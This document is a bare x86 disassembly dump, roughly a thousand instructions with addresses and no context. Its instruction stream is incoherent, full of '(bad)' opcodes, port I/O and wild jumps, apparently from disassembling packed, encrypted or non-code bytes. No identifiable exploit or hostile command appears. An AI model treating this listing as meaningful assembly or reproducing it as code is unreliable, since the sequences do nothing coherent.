  41bede:	gs dec ebp
  41bee0:	jecxz  0x41be69
  41bee2:	mov    ecx,0xda620dc9
  41bee7:	cdq    
  41bee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bee9:	cmp    DWORD PTR [edx+0x6ffab617],eax
  41beef:	mov    ebp,0x71f91d86
  41bef4:	loop   0x41bed4
  41bef6:	inc    ecx
  41bef7:	cmp    BYTE PTR [edi+ebp*1],0x82
  41befb:	jb     0x41bf64
  41befd:	adc    al,0x87
  41beff:	mov    bh,0x6a
  41bf01:	inc    esp
  41bf02:	in     eax,0xa3
  41bf04:	js     0x41bf55
  41bf06:	jbe    0x41bea5
  41bf08:	mov    edi,0xa9e52b65
  41bf0d:	sub    DWORD PTR [eax-0x4b0d6b28],0x5c
  41bf14:	push   es
  41bf15:	clc    
  41bf16:	xchg   bh,bl
  41bf18:	pop    esi
  41bf19:	mov    esp,0x6c6ff336
  41bf1e:	sbb    BYTE PTR [eax-0x749b652e],bl
  41bf24:	mov    eax,ds:0x71d0b959
  41bf29:	jno    0x41bf63
  41bf2b:	mov    dl,bl
  41bf2d:	push   eax
  41bf2e:	repnz or dl,BYTE PTR [edx+ecx*2-0x1434e15e]
  41bf36:	dec    ecx
  41bf37:	jo     0x41beff
  41bf39:	dec    esi
  41bf3a:	test   al,0x5b
  41bf3c:	je     0x41bfa3
  41bf3e:	stos   BYTE PTR es:[edi],al
  41bf3f:	std    
  41bf40:	cs cdq 
  41bf42:	mov    al,ds:0xfeaacc5
  41bf47:	shl    dh,cl
  41bf49:	inc    esp
  41bf4a:	inc    esp
  41bf4b:	test   BYTE PTR [ebx+0x69ace9b5],0x72
  41bf52:	xchg   ebp,eax
  41bf53:	lods   eax,DWORD PTR ds:[esi]
  41bf54:	addr16 pop ss
  41bf56:	xor    eax,0xd5801876
  41bf5b:	int3   
  41bf5c:	push   ds
  41bf5d:	retf   0xc72a
  41bf60:	test   ecx,eax
  41bf62:	in     al,0x40
  41bf64:	xor    al,0xf6
  41bf66:	(bad)  
  41bf67:	fwait
  41bf68:	cli    
  41bf69:	sub    eax,0x994e07e6
  41bf6e:	add    BYTE PTR [ebx+0x5f763f63],dl
  41bf74:	fild   QWORD PTR [eax+0x19]
  41bf77:	xchg   ebp,eax
  41bf78:	(bad)  
  41bf79:	data16 (bad) 
  41bf7b:	ins    DWORD PTR es:[edi],dx
  41bf7c:	outs   dx,BYTE PTR ds:[esi]
  41bf7d:	(bad)  
  41bf7e:	lock aaa 
  41bf80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf81:	and    al,BYTE PTR [ebp+0x1acb4191]
  41bf87:	out    dx,eax
  41bf88:	test   eax,0x105951d8
  41bf8d:	or     eax,0x83e3729a
  41bf92:	(bad)  
  41bf93:	jmp    0x477a1b9a
  41bf98:	jmp    0x41bf1e
  41bf9a:	mov    eax,0xbb269905
  41bf9f:	xchg   edi,eax
  41bfa0:	and    eax,0x7c1e1e0e
  41bfa5:	fild   QWORD PTR [eax+ecx*1+0x2]
  41bfa9:	shl    DWORD PTR [ecx],0x4b
  41bfac:	jbe    0x41bf9b
  41bfae:	cmp    edi,ebp
  41bfb0:	mov    ds:0xc6d55df5,al
  41bfb5:	call   0x2d3a3cc0
  41bfba:	repnz and eax,0xc23b3a21
  41bfc0:	xor    ebx,DWORD PTR [edi]
  41bfc2:	loopne 0x41bfb5
  41bfc4:	jle    0x41c009
  41bfc6:	or     ebp,DWORD PTR [ebx]
  41bfc8:	sbb    al,0xae
  41bfca:	mov    fs,WORD PTR [eax+0x66]
  41bfcd:	push   es
  41bfce:	and    BYTE PTR [edi+ebx*8],cl
  41bfd1:	mov    bh,0xf8
  41bfd3:	push   edx
  41bfd4:	sub    al,0xa2
  41bfd6:	es cmp al,0x2f
  41bfd9:	ret    0xa68f
  41bfdc:	dec    ebp
  41bfdd:	fdiv   QWORD PTR [edx+0x7c]
  41bfe0:	add    eax,0x57f9f104
  41bfe5:	stos   DWORD PTR es:[edi],eax
  41bfe6:	cs std 
  41bfe8:	fiadd  DWORD PTR [edx+edx*2]
  41bfeb:	xor    cl,bh
  41bfed:	outs   dx,DWORD PTR ds:[esi]
  41bfee:	cs (bad) 
  41bff0:	rcl    BYTE PTR [ebx+edi*2],cl
  41bff3:	bound  esp,QWORD PTR [ebx+0x564c58d6]
  41bff9:	scas   al,BYTE PTR es:[edi]
  41bffa:	rcr    DWORD PTR [edi-0x33],1
  41bffd:	ficomp WORD PTR [edi+ebp*4-0x329b165a]
  41c004:	or     edi,DWORD PTR [ebp+0x695440f]
  41c00a:	mov    ebx,0xc3d9668
  41c00f:	sbb    eax,0x6dab4897
  41c014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c015:	sbb    BYTE PTR [esi+0x3d7d3cde],0x11
  41c01c:	les    ebx,FWORD PTR [eax+eax*1]
  41c01f:	repnz repz dec edx
  41c022:	fisttp DWORD PTR [esi-0xe]
  41c025:	pushf  
  41c026:	jne    0x41bfac
  41c028:	js     0x41c07b
  41c02a:	jecxz  0x41c0a6
  41c02c:	sub    eax,0xa5483d43
  41c031:	retf   0xa9fb
  41c034:	rcr    DWORD PTR [edi-0x6e],1
  41c037:	fmulp  st(3),st
  41c039:	dec    ebp
  41c03a:	out    0x59,al
  41c03c:	sbb    BYTE PTR [edx-0x480e6601],al
  41c042:	mov    eax,DWORD PTR [edx-0x744646a9]
  41c048:	xor    BYTE PTR [eax-0x3e5731ef],al
  41c04e:	jge    0x41c082
  41c050:	scas   eax,DWORD PTR es:[edi]
  41c051:	lahf   
  41c052:	adc    BYTE PTR [eax+0x3],ch
  41c055:	(bad)  
  41c056:	fucomi st,st(5)
  41c058:	cld    
  41c059:	rol    DWORD PTR [edx+0x26],cl
  41c05c:	and    al,0x85
  41c05e:	sub    bh,0xb5
  41c061:	sub    DWORD PTR [bx+di],esi
  41c064:	cmc    
  41c065:	mov    dl,0x15
  41c067:	sbb    BYTE PTR [ebx+0x496cf38f],al
  41c06d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c06e:	pop    ebp
  41c06f:	cmp    eax,0x7fa1bece
  41c074:	cld    
  41c075:	bound  esi,QWORD PTR [edx+0x1f3ca4a9]
  41c07b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c07c:	adc    bh,0xd7
  41c07f:	mov    fs,WORD PTR [ecx-0x7592b28d]
  41c085:	aas    
  41c086:	and    al,0xb5
  41c088:	sub    eax,0x7652f59e
  41c08d:	mov    al,BYTE PTR [eax+0x21]
  41c090:	sbb    al,0x11
  41c092:	sbb    DWORD PTR [edi+0x5cc1c3b2],ebx
  41c098:	jp     0x41c0b5
  41c09a:	aad    0x78
  41c09c:	sbb    al,0x15
  41c09e:	mov    cl,0x3c
  41c0a0:	(bad)  
  41c0a1:	loope  0x41c104
  41c0a3:	into   
  41c0a4:	test   DWORD PTR [ebx],edx
  41c0a6:	fist   DWORD PTR [ebp+0x4e]
  41c0a9:	mov    eax,ds:0xfaa55e24
  41c0ae:	cs mov ah,0x20
  41c0b1:	call   0xa44f6ad4
  41c0b6:	sbb    DWORD PTR ds:0xf894f197,eax
  41c0bc:	arpl   ax,cx
  41c0be:	push   edx
  41c0bf:	pop    esi
  41c0c0:	or     ecx,DWORD PTR [ebx]
  41c0c2:	xor    bl,BYTE PTR [esi-0x6bcd9d58]
  41c0c8:	lods   eax,DWORD PTR ds:[esi]
  41c0c9:	test   BYTE PTR [ebx+0x1],cl
  41c0cc:	xchg   esi,eax
  41c0cd:	sbb    dl,BYTE PTR [esi-0x2a]
  41c0d0:	out    0xf4,al
  41c0d2:	dec    edx
  41c0d3:	je     0x41c07a
  41c0d5:	dec    ecx
  41c0d6:	push   esp
  41c0d7:	cdq    
  41c0d8:	cmp    eax,0x8b0c095b
  41c0dd:	inc    esi
  41c0de:	xchg   esi,eax
  41c0df:	xchg   esp,eax
  41c0e1:	dec    esp
  41c0e2:	ret    
  41c0e3:	sbb    al,0x98
  41c0e5:	aaa    
  41c0e6:	into   
  41c0e7:	adc    DWORD PTR [ecx+0x32],ecx
  41c0ea:	imul   eax,edx,0x46
  41c0ed:	cmp    BYTE PTR [esi-0x54],bh
  41c0f0:	add    al,0x7c
  41c0f2:	pop    ebx
  41c0f3:	cmp    eax,0xc04861a0
  41c0f8:	jnp    0x41c10a
  41c0fa:	mov    al,ds:0x212306ce
  41c0ff:	loope  0x41c0f6
  41c101:	adc    al,0x89
  41c103:	xor    edx,DWORD PTR [eax+eax*8-0x6ab079ed]
  41c10a:	(bad)  [esi+0x58]
  41c10d:	(bad)  
  41c10e:	push   esp
  41c10f:	fmul   DWORD PTR [ebx+0x7c]
  41c112:	mov    dh,0x95
  41c114:	ror    cl,1
  41c116:	dec    eax
  41c117:	push   edi
  41c118:	add    ecx,DWORD PTR [esi-0x4005f15a]
  41c11e:	(bad)  
  41c11f:	ja     0x41c11e
  41c121:	shr    DWORD PTR [eax-0x52],cl
  41c124:	js     0x41c0e9
  41c126:	in     eax,dx
  41c127:	fmul   QWORD PTR [eax+0x212eee57]
  41c12d:	aad    0xbe
  41c12f:	or     al,0xdf
  41c131:	mov    dl,al
  41c133:	push   0x27946f03
  41c138:	out    0x4d,eax
  41c13a:	test   DWORD PTR [edi+0x5d],0xe13367a7
  41c141:	and    esp,DWORD PTR [ebx]
  41c143:	mov    bh,ah
  41c145:	adc    bl,dl
  41c147:	dec    eax
  41c148:	stos   DWORD PTR es:[edi],eax
  41c149:	pop    ebp
  41c14a:	jl     0x41c1b3
  41c14c:	xchg   esi,eax
  41c14d:	and    DWORD PTR [esi*1-0x25674b89],eax
  41c154:	pop    ebp
  41c155:	or     esp,DWORD PTR [edi]
  41c157:	pop    ss
  41c158:	push   0x6466c34e
  41c15d:	repz lds edx,FWORD PTR [edi+0x56]
  41c161:	cmp    BYTE PTR [edx+0x76],ah
  41c164:	out    dx,eax
  41c165:	sbb    ecx,0x8d211b81
  41c16b:	jg     0x41c1cc
  41c16d:	mov    eax,ds:0x454aabca
  41c172:	retf   0x5014
  41c175:	inc    esi
  41c176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c177:	popa   
  41c178:	shl    dl,1
  41c17a:	sahf   
  41c17b:	jns    0x41c1c9
  41c17d:	xor    al,BYTE PTR [ebx+0xb]
  41c180:	int3   
  41c181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c182:	xchg   ebx,eax
  41c183:	or     esi,DWORD PTR [eax+0x3112ea3b]
  41c189:	dec    esp
  41c18a:	mov    dh,0xe0
  41c18c:	jge    0x41c13f
  41c18e:	into   
  41c18f:	rol    esi,0x60
  41c192:	xor    al,cl
  41c194:	repz imul DWORD PTR [esi]
  41c197:	bnd jmp 0x41c218
  41c19a:	bound  ebx,QWORD PTR [edx]
  41c19c:	sbb    BYTE PTR [ebp-0x4c7441f0],ah
  41c1a2:	cmp    ecx,DWORD PTR [edx+0x45]
  41c1a5:	push   edx
  41c1a6:	dec    esp
  41c1a7:	(bad)  
  41c1a8:	jle    0x41c1f4
  41c1aa:	mov    es,WORD PTR [ecx]
  41c1ac:	pop    esi
  41c1ad:	push   0x6a48ba44
  41c1b2:	(bad)  
  41c1b3:	rcl    DWORD PTR [ebx-0x2bf92fb4],cl
  41c1b9:	push   edi
  41c1ba:	(bad)  
  41c1bb:	js     0x41c1b0
  41c1bd:	mov    ch,0x2b
  41c1bf:	lods   al,BYTE PTR ds:[esi]
  41c1c0:	push   esp
  41c1c1:	aad    0x29
  41c1c3:	jns    0x41c1de
  41c1c5:	or     esi,DWORD PTR [ebp+0x11bde9cf]
  41c1cb:	dec    ecx
  41c1cc:	xchg   edx,eax
  41c1cd:	in     eax,dx
  41c1ce:	fcomp  DWORD PTR [esp+edx*2-0x5aa03f4e]
  41c1d5:	push   ebp
  41c1d6:	jmp    0xd16:0x15676bc8
  41c1dd:	fsubr  DWORD PTR [edx+0x7f8232aa]
  41c1e3:	int3   
  41c1e4:	test   al,0xbe
  41c1e6:	lods   eax,DWORD PTR ds:[esi]
  41c1e7:	mov    edi,0x54072ed7
  41c1ec:	and    DWORD PTR [edx],0xffffffd2
  41c1ef:	fadd   QWORD PTR es:[ebx+0x31]
  41c1f3:	loopne 0x41c17c
  41c1f5:	pop    ecx
  41c1f6:	inc    edx
  41c1f7:	ret    0xc3fc
  41c1fa:	adc    al,0x81
  41c1fc:	out    dx,eax
  41c1fd:	cmp    ah,BYTE PTR [ecx+edi*4]
  41c200:	ret    0x21f3
  41c203:	pop    edi
  41c204:	ss or  al,0x6f
  41c207:	xor    eax,0x195e1dd5
  41c20c:	push   esi
  41c20d:	dec    esi
  41c20e:	pop    edx
  41c20f:	stos   BYTE PTR es:[edi],al
  41c210:	cmp    eax,0x8e7b03bb
  41c215:	std    
  41c216:	jnp    0x41c255
  41c218:	pop    ecx
  41c219:	mov    bl,0x10
  41c21b:	dec    ebp
  41c21c:	xchg   DWORD PTR [ecx-0x425a92aa],ebx
  41c222:	inc    edx
  41c223:	push   0x7b
  41c225:	pop    ebx
  41c226:	(bad)  
  41c227:	jle    0x41c1be
  41c229:	outs   dx,BYTE PTR ds:[esi]
  41c22a:	out    0x27,al
  41c22c:	pop    es
  41c22d:	ins    BYTE PTR es:[edi],dx
  41c22e:	mov    ds:0x36d9249a,eax
  41c233:	ret    0x890a
  41c236:	adc    BYTE PTR [eax],0xb8
  41c239:	test   BYTE PTR [eax-0x17],bh
  41c23c:	dec    eax
  41c23d:	and    cl,bl
  41c23f:	fiadd  DWORD PTR [eax]
  41c241:	retf   
  41c242:	jg     0x41c277
  41c244:	frstor [edx-0x1ec5f33b]
  41c24a:	adc    BYTE PTR [eax+0x7b],al
  41c24d:	and    bh,BYTE PTR [edi]
  41c24f:	test   DWORD PTR ds:0x21e43cd8,eax
  41c255:	ret    0x8834
  41c258:	dec    ebp
  41c259:	fdiv   DWORD PTR ds:0x40531f14
  41c25f:	rol    BYTE PTR [ebp-0x694d858a],0xb4
  41c266:	xchg   ebp,eax
  41c267:	in     eax,dx
  41c268:	loope  0x41c295
  41c26a:	retf   0x6535
  41c26d:	ror    BYTE PTR [edi-0x28],cl
  41c270:	adc    BYTE PTR [eax],bh
  41c272:	hlt    
  41c273:	adc    al,0xde
  41c275:	or     BYTE PTR [esi-0x8],0x7c
  41c279:	ret    
  41c27a:	push   0xc4198785
  41c27f:	pop    eax
  41c280:	pop    esp
  41c281:	xor    bh,bl
  41c283:	stc    
  41c284:	adc    BYTE PTR [edi+ebx*1+0x4a],0x4f
  41c289:	daa    
  41c28a:	pop    edi
  41c28b:	in     eax,0x49
  41c28d:	int    0xfc
  41c28f:	(bad)  
  41c290:	neg    BYTE PTR [edi]
  41c292:	xor    edx,DWORD PTR [ebx-0x414abc83]
  41c298:	test   BYTE PTR [edx],ah
  41c29a:	inc    eax
  41c29b:	in     al,0x87
  41c29d:	ror    BYTE PTR [esi],0x48
  41c2a0:	dec    esp
  41c2a1:	mov    esp,0x23a274c
  41c2a6:	icebp  
  41c2a7:	add    bl,BYTE PTR [edx+0x590fbb59]
  41c2ad:	or     esi,DWORD PTR [ebp+0x7e]
  41c2b0:	sub    BYTE PTR [eax-0x42eb7b94],cl
  41c2b6:	pop    ds
  41c2b7:	stos   DWORD PTR es:[edi],eax
  41c2b8:	call   0xfa2dfc37
  41c2bd:	sbb    BYTE PTR ds:[edx],al
  41c2c0:	bound  eax,QWORD PTR [esi-0x50293564]
  41c2c6:	int    0xaa
  41c2c8:	mov    BYTE PTR [edx-0x7beb7d3c],al
  41c2ce:	inc    ecx
  41c2cf:	pop    ss
  41c2d0:	ins    DWORD PTR es:[edi],dx
  41c2d1:	out    dx,al
  41c2d2:	mov    ah,dl
  41c2d4:	and    edx,ebp
  41c2d6:	sub    ebp,DWORD PTR [edx]
  41c2d8:	mov    esi,edx
  41c2da:	dec    edi
  41c2db:	test   al,0xe7
  41c2dd:	inc    eax
  41c2de:	lds    edx,FWORD PTR [ecx-0x2840f7f0]
  41c2e4:	cmp    BYTE PTR [ebx-0x73d5b503],dl
  41c2ea:	push   eax
  41c2eb:	jo     0x41c301
  41c2ed:	stos   DWORD PTR es:[edi],eax
  41c2ee:	adc    eax,0xf0d3757a
  41c2f3:	aas    
  41c2f4:	inc    esi
  41c2f5:	addr16 pop esi
  41c2f7:	repnz leave 
  41c2f9:	pop    es
  41c2fa:	je     0x41c2d1
  41c2fc:	jp     0x41c2df
  41c2fe:	imul   esi,eax,0x39
  41c301:	(bad)  
  41c302:	call   0x4c93:0xe0b3f0a3
  41c309:	pop    eax
  41c30a:	and    ah,BYTE PTR [ebx-0x65cb706b]
  41c310:	aam    0x77
  41c312:	inc    ecx
  41c313:	cs ret 
  41c315:	in     al,0x42
  41c317:	xchg   ebx,eax
  41c318:	add    cl,BYTE PTR [ebp-0x75]
  41c31b:	out    dx,al
  41c31c:	xchg   esp,eax
  41c31d:	ret    0xc25a
  41c320:	repz scas eax,DWORD PTR es:[edi]
  41c322:	dec    edx
  41c323:	test   al,0xd0
  41c325:	cmp    esp,edi
  41c327:	neg    BYTE PTR [edx]
  41c329:	lock jmp 0x41c2d0
  41c32c:	popa   
  41c32d:	stc    
  41c32e:	sub    BYTE PTR [ecx-0x44],dl
  41c331:	mov    DWORD PTR [eax+eax*4],esi
  41c334:	push   ds
  41c335:	lea    edi,[ecx+0x50]
  41c338:	inc    esi
  41c339:	mov    dl,BYTE PTR [esi+edx*2]
  41c33c:	ins    BYTE PTR es:[edi],dx
  41c33d:	test   DWORD PTR [eax],ecx
  41c33f:	lea    ecx,[esp+edi*1]
  41c342:	push   ebx
  41c343:	jmp    0x41c346
  41c345:	sub    eax,0xd0371f16
  41c34a:	push   ecx
  41c34b:	sar    al,cl
  41c34d:	pop    ds
  41c34e:	data16 xor bh,BYTE PTR [ebx+0xa9bb384]
  41c355:	jno    0x41c37f
  41c357:	add    DWORD PTR [edx+0x70b9814a],ebx
  41c35d:	into   
  41c35e:	pop    ds
  41c35f:	cmp    al,0x97
  41c361:	pslld  mm3,QWORD PTR [esi-0x39]
  41c365:	xlat   BYTE PTR ds:[ebx]
  41c366:	inc    edi
  41c367:	shr    BYTE PTR [edx+0x47cc3338],1
  41c36d:	inc    edx
  41c36e:	inc    esp
  41c36f:	adc    BYTE PTR [edi-0x4042e703],ah
  41c375:	dec    eax
  41c376:	ins    DWORD PTR es:[edi],dx
  41c377:	dec    ebx
  41c378:	sub    BYTE PTR ds:0xfa03422b,bl
  41c37e:	lea    esp,[esi+0x57c8058a]
  41c384:	test   DWORD PTR [ebx+0x22f7769f],ecx
  41c38a:	or     BYTE PTR [esi-0x635c4354],ch
  41c390:	in     al,dx
  41c391:	xchg   esp,eax
  41c392:	jnp    0x41c366
  41c394:	jae    0x41c3ff
  41c396:	test   eax,0x7a1379d9
  41c39b:	mov    dl,0x89
  41c39d:	mov    esp,0xc0d8862a
  41c3a2:	and    BYTE PTR [eax-0x3a],dh
  41c3a5:	dec    ebp
  41c3a6:	loope  0x41c385
  41c3a8:	jle    0x41c3ae
  41c3aa:	xchg   ebp,eax
  41c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ac:	cmp    al,0xd0
  41c3af:	sub    esi,DWORD PTR [esi]
  41c3b1:	sbb    bl,dh
  41c3b3:	dec    esi
  41c3b4:	imul   esi,edi,0xb8926459
  41c3ba:	xor    eax,DWORD PTR ds:0x820716a3
  41c3c0:	test   al,0x38
  41c3c2:	or     bl,BYTE PTR ds:0x5b260c76
  41c3c8:	addr16 xchg esi,eax
  41c3ca:	outs   dx,BYTE PTR ds:[esi]
  41c3cb:	sbb    DWORD PTR [eax+0x2d],ebp
  41c3ce:	jns    0x41c42c
  41c3d0:	adc    al,0xe9
  41c3d2:	lods   al,BYTE PTR ds:[esi]
  41c3d3:	mov    ch,0x80
  41c3d5:	sti    
  41c3d6:	sbb    BYTE PTR [edx+0x35d4f8a5],bl
  41c3dc:	ja     0x41c3f1
  41c3de:	pop    ebx
  41c3df:	div    BYTE PTR [ebp-0x64]
  41c3e2:	mov    esi,0x5db324dc
  41c3e7:	popf   
  41c3e8:	xor    edi,DWORD PTR ds:0x5ac14913
  41c3ee:	and    dl,BYTE PTR [esi]
  41c3f0:	jg     0x41c391
  41c3f2:	push   edi
  41c3f3:	mov    edx,0xb2f28d61
  41c3f8:	pop    esi
  41c3f9:	popa   
  41c3fa:	out    0xe6,al
  41c3fc:	gs sbb edi,esp
  41c3ff:	ret    0xf1ab
  41c402:	cwde   
  41c403:	xor    eax,ecx
  41c405:	mov    al,BYTE PTR [eax-0x611c7443]
  41c40b:	jge    0x41c46d
  41c40d:	xlat   BYTE PTR ds:[ebx]
  41c40e:	add    BYTE PTR [ecx],bh
  41c410:	inc    esp
  41c411:	dec    eax
  41c412:	fnsave [ebx+0x4c]
  41c415:	xor    ecx,esi
  41c417:	pop    esi
  41c418:	jno    0x41c403
  41c41a:	jecxz  0x41c46b
  41c41c:	or     edx,DWORD PTR [edx]
  41c41e:	xlat   BYTE PTR ds:[ebx]
  41c41f:	push   0x26fb7fe6
  41c424:	jbe    0x41c483
  41c426:	mov    bh,0x2f
  41c428:	sbb    DWORD PTR [esi-0x19],edi
  41c42b:	push   eax
  41c42c:	xchg   BYTE PTR [eax-0x2a],dl
  41c42f:	jecxz  0x41c45e
  41c431:	jne    0x41c3d2
  41c433:	fwait
  41c434:	pop    esp
  41c435:	fadd   DWORD PTR [eax+0x49]
  41c438:	xchg   DWORD PTR [ecx+0x1caef09f],edi
  41c43e:	cdq    
  41c43f:	mov    ds:0x4bf0d9c4,eax
  41c444:	fistp  WORD PTR [esi+eax*2]
  41c447:	mov    DWORD PTR [ebx],edx
  41c449:	xchg   BYTE PTR [ecx],ch
  41c44b:	xor    al,bl
  41c44d:	pop    esi
  41c44e:	stos   DWORD PTR es:[edi],eax
  41c44f:	mov    cl,0x5f
  41c451:	stc    
  41c452:	stc    
  41c453:	pop    ss
  41c454:	cs dec ebx
  41c456:	loope  0x41c4a5
  41c458:	add    al,BYTE PTR [esi+0x12236d1d]
  41c45e:	not    BYTE PTR [edx+ecx*1]
  41c461:	push   0x30
  41c463:	sti    
  41c464:	cli    
  41c465:	lds    ebp,FWORD PTR [ebp+0x6e7d2200]
  41c46b:	sbb    eax,0x3276e50f
  41c470:	push   ebx
  41c471:	mov    dl,0xce
  41c473:	add    al,0x27
  41c475:	jmp    0x4a96:0x82495a3f
  41c47c:	retf   0xea41
  41c47f:	xor    al,0x7a
  41c481:	jge    0x41c496
  41c483:	call   0x9c5cf8f0
  41c488:	out    0xa9,eax
  41c48a:	sub    ecx,DWORD PTR [ecx]
  41c48c:	rcl    DWORD PTR [ecx+ebx*2-0x13633654],cl
  41c493:	mov    esi,0xab52ef2d
  41c498:	test   BYTE PTR [ecx+0x59],cl
  41c49b:	(bad)  
  41c49c:	ins    BYTE PTR es:[edi],dx
  41c49d:	mov    ch,BYTE PTR [edi]
  41c49f:	clc    
  41c4a0:	jg     0x41c48c
  41c4a2:	js     0x41c479
  41c4a4:	xor    DWORD PTR [esi-0x19b6c75b],edi
  41c4aa:	and    eax,0x8483b268
  41c4af:	or     BYTE PTR [esp+eax*2],al
  41c4b2:	add    esi,DWORD PTR ds:0xed20c193
  41c4b8:	add    dh,0x2e
  41c4bb:	inc    edx
  41c4bc:	cwde   
  41c4bd:	jmp    0x86233e3f
  41c4c2:	or     DWORD PTR [ebp-0x19ffec8d],ecx
  41c4c8:	cwde   
  41c4c9:	call   0x405e8de3
  41c4ce:	add    dl,ah
  41c4d0:	dec    ebp
  41c4d1:	pop    ds
  41c4d2:	sar    BYTE PTR [eax+edi*8+0x4e9bf283],cl
  41c4d9:	jg     0x41c4f6
  41c4db:	retf   
  41c4dc:	out    0x59,eax
  41c4de:	das    
  41c4df:	test   BYTE PTR [ebp+edi*2+0x1e],ch
  41c4e3:	push   ds
  41c4e4:	lods   al,BYTE PTR ds:[esi]
  41c4e5:	pop    ebp
  41c4e6:	int    0x65
  41c4e8:	xor    eax,0xba2948dd
  41c4ed:	push   ebp
  41c4ee:	das    
  41c4ef:	cld    
  41c4f0:	adc    eax,0xb313c12f
  41c4f5:	shl    ah,0x44
  41c4f8:	call   0xa4b3:0xb0ac2c31
  41c4ff:	repnz or bh,al
  41c502:	pop    ebp
  41c503:	cwde   
  41c504:	cli    
  41c505:	icebp  
  41c506:	add    eax,0x4b9fc89f
  41c50b:	sbb    BYTE PTR [eax-0x38],bh
  41c50e:	jp     0x41c525
  41c510:	iretw  
  41c512:	fnstcw WORD PTR [ebx+0x3f2ca2ea]
  41c518:	jno    0x41c581
  41c51a:	fisttp DWORD PTR [eax-0x285071c8]
  41c520:	pop    ecx
  41c521:	push   es
  41c522:	(bad)  
  41c523:	mov    al,ds:0x48c3aa26
  41c528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c529:	cmc    
  41c52a:	xor    BYTE PTR [ecx-0x6b],dh
  41c52d:	dec    ebx
  41c52e:	xor    eax,0x74bf2732
  41c533:	xchg   esp,eax
  41c534:	aas    
  41c535:	cmp    esi,DWORD PTR [ebx-0x3c]
  41c538:	sub    eax,DWORD PTR [eax+0x6b]
  41c53b:	mov    cl,0x7d
  41c53d:	mov    ds:0x4f8e78a0,al
  41c542:	das    
  41c543:	mov    bh,0x4b
  41c545:	iret   
  41c546:	xchg   ebp,eax
  41c547:	adc    bh,ch
  41c549:	jmp    0x41c597
  41c54b:	scas   eax,DWORD PTR es:[edi]
  41c54c:	xchg   DWORD PTR [ecx-0x2cdf3bbb],esp
  41c552:	jmp    DWORD PTR [ebp-0x46]
  41c555:	xor    DWORD PTR [ecx-0x1c5678b],eax
  41c55b:	or     DWORD PTR [ecx+0x7fe1ab53],0xffffffc5
  41c562:	mov    bl,BYTE PTR ds:0xe713fab2
  41c568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c569:	and    al,0xa3
  41c56b:	jl     0x41c540
  41c56d:	or     al,0x17
  41c56f:	mov    al,ds:0xc6b1a8a8
  41c574:	jp     0x41c551
  41c576:	imul   edi,esp,0x82322279
  41c57c:	imul   edx,DWORD PTR [ecx+0x5b5e04f6],0x21
  41c583:	addr16 ret 0xe973
  41c587:	dec    al
  41c589:	jae    0x41c55f
  41c58b:	cmc    
  41c58c:	test   eax,0xa9d400cd
  41c591:	jg     0x41c5ab
  41c593:	inc    esp
  41c594:	fistp  WORD PTR [ecx-0x1a19812f]
  41c59a:	cwde   
  41c59b:	push   cs
  41c59c:	cmc    
  41c59d:	aaa    
  41c59e:	(bad)  
  41c59f:	in     al,dx
  41c5a0:	pop    ss
  41c5a1:	je     0x41c5b2
  41c5a3:	inc    edx
  41c5a4:	adc    eax,0xafe862cd
  41c5a9:	(bad)  
  41c5aa:	mov    esi,0x458bb77f
  41c5af:	fcom   DWORD PTR [esp+eiz*2-0x3573678e]
  41c5b6:	push   ss
  41c5b7:	out    dx,eax
  41c5b8:	push   edi
  41c5b9:	and    eax,0xee94ff2c
  41c5be:	jns    0x41c600
  41c5c0:	in     eax,0x63
  41c5c2:	add    DWORD PTR [ecx+0x3],ebx
  41c5c5:	fmul   st(1),st
  41c5c7:	sbb    ch,ah
  41c5c9:	jmp    0x41c5fd
  41c5cb:	rcl    DWORD PTR [esi+0x8],cl
  41c5ce:	jle    0x41c586
  41c5d0:	lds    ecx,FWORD PTR [edi-0x2]
  41c5d3:	int    0x9b
  41c5d5:	cmc    
  41c5d6:	in     al,0x50
  41c5d8:	jl     0x41c5e8
  41c5da:	mov    esp,db1
  41c5dd:	xchg   DWORD PTR [ebx+0x2b55ca7d],ecx
  41c5e3:	arpl   WORD PTR [esp+ebp*8+0x4a],sp
  41c5e7:	neg    BYTE PTR [edx+0x20]
  41c5ea:	sbb    al,0x4e
  41c5ec:	jle    0x41c5d9
  41c5ee:	div    BYTE PTR [edi]
  41c5f0:	test   eax,0x11086fcf
  41c5f5:	xor    eax,0x41d305ef
  41c5fa:	gs xchg esi,edx
  41c5fd:	fwait
  41c5fe:	adc    DWORD PTR [esi],eax
  41c600:	outs   dx,DWORD PTR ds:[esi]
  41c601:	fs je  0x41c660
  41c604:	test   BYTE PTR [ebx*4+0x7b6df9d4],bl
  41c60b:	inc    ebx
  41c60c:	jmp    0x66bddf27
  41c611:	repnz pop edx
  41c613:	in     al,0x8c
  41c615:	ret    0xf2a4
  41c618:	(bad)  
  41c619:	addr16 and eax,0x77954cb8
  41c61f:	fcmovnbe st,st(4)
  41c621:	xchg   edx,eax
  41c622:	cs mov dl,0xd6
  41c625:	int    0x78
  41c627:	push   cs
  41c628:	aas    
  41c629:	rol    ch,cl
  41c62b:	xor    al,BYTE PTR [esi-0x52da01d2]
  41c631:	pop    eax
  41c632:	or     BYTE PTR [edx-0x38],0xf0
  41c636:	adc    bl,BYTE PTR [edx+0x19]
  41c639:	xchg   edx,eax
  41c63a:	adc    al,BYTE PTR [esi-0x78]
  41c63d:	mov    cl,0x28
  41c63f:	mov    ch,BYTE PTR [ebx+eax*8]
  41c642:	xchg   esi,eax
  41c643:	inc    esp
  41c644:	rdpmc  
  41c646:	fdiv   st,st(2)
  41c648:	repz mov WORD PTR [ecx-0x3e],ds
  41c64c:	or     BYTE PTR [esi+0x5491f4de],dh
  41c652:	or     BYTE PTR [ebx],dh
  41c654:	cmp    DWORD PTR [edi+0x42e97841],ecx
  41c65a:	sub    edx,DWORD PTR ds:0x75905e05
  41c660:	les    esp,FWORD PTR [edi-0x30]
  41c663:	cmp    eax,0x2fb0c2c
  41c668:	pop    ss
  41c669:	inc    edx
  41c66a:	pusha  
  41c66b:	nop
  41c66c:	jbe    0x41c6e2
